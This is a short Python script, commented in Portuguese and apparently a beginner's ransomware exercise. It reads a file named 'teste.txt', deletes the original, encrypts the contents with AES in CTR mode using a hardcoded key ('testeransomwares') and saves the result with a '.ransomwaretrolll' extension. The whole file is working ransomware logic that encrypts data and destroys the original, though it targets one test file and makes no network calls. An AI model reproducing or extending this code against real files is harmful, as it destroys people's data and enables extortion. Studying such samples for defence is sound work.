import os
import pyaes

## abrir o arquivo

file_name = "teste.txt"
file = open(file_name,"rb")
file_data = file.read()
file.close()

## remove arquivo original

os.remove(file_name)

## definir a chave de encriptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado

new_file = file_name + ".ransomwaretrolll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

